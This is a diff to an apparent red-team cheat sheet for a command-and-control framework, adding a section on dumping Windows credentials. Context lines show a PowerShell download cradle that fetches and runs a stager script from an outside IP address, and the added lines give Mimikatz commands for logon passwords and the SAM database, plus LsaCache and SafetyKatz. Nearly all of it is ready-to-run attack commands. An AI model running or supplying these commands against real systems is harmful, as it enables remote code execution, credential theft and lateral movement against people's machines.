@@ -47,3 +47,25 @@ self.close
 - Then run ImpersonateProcess ```ImpersonateProcess /processid:"<PROCESS ID>"```
 - Then run the Launcher again to spawn another grunt. ```Powershell iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10/Stgr.ps1')```
 - Go back to the current context using task ```RevertToSelf```
+
+### Dumping credentials
+- From System or High integrity
+#### Logon passwords
+```
+Mimikatz sekurlsa::logonpasswords
+```
+
+#### Cached credentials
+```
+LsaCache
+```
+
+#### SAM
+```
+Mimikatz lsadump::sam
+```
+
+#### SafetyKatz
+```
+SafetyKatz
+```
